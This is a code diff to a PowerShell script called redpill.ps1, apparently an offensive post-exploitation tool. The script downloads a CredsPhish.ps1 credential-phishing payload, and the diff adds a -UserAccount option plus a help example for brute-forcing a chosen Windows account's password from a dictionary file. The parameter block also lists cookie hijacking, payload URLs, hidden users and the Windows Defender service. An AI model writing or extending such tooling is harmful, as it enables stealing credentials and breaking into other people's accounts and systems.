@@ -95,6 +95,7 @@
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
    [string]$CookieHijack="False",
+   [string]$UserAccount="false",
    [string]$PayloadURL="false",
    [string]$LiveStream="false",
    [string]$HiddenUser="false",
@@ -1203,8 +1204,8 @@ If($PhishCreds -ieq "Start" -or $PhishCreds -ieq "Brute"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,19921875/KB
-   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 17 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 16,005859375/KB
+   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 16 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download CredsPhish.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
       If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
@@ -3929,6 +3930,10 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Brute -Dicionary "`$Env:TMP\passwords.txt"
       Brute force user account using -Dicionary [ path ] text file
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -PhishCreds Brute -Dicionary "`$Env:TMP\passwords.txt" -UserAccount testme
+      Brute force 'testme' user account using -Dicionary [ path ] text file
 
    .OUTPUTS
       Captured Credentials (logon)
